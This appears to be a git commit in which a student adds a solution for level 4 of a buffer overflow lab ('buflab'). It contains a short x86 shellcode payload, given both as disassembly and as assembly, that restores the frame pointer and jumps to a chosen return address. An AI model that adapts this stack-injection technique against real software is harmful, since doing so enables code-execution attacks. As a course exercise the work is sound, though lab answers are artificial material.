e34b69b462e7a6cfb814aec258cc456f51a352cc
ZhangZhenghao <zhangzhenghao@hotmail.com>
2015-08-02 12:45:44 +0800

    FInifished level 4

---
+++ buflab/level4.d
@@ -0,0 +1,12 @@
+
+level4.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	68 3a 8e 04 08       	push   $0x8048e3a
+   5:	a1 08 d1 04 08       	mov    0x804d108,%eax
+   a:	89 e5                	mov    %esp,%ebp
+   c:	83 c5 2c             	add    $0x2c,%ebp
+   f:	c3                   	ret    
---
+++ buflab/level4.s
@@ -0,0 +1,5 @@
+pushl	$0x08048e3a
+movl	0x804d108,%eax
+movl	%esp,%ebp
+addl	$0x2c,%ebp
+ret
